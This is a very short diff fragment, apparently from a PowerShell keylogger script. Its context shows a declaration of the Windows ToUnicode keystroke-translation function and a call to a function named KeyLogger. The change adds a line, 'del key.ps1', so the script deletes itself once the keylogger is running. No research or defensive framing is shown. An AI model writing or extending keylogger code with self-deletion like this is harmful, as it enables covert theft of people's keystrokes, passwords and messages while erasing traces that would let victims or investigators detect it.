@@ -115,3 +115,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 
 KeyLogger
+del key.ps1
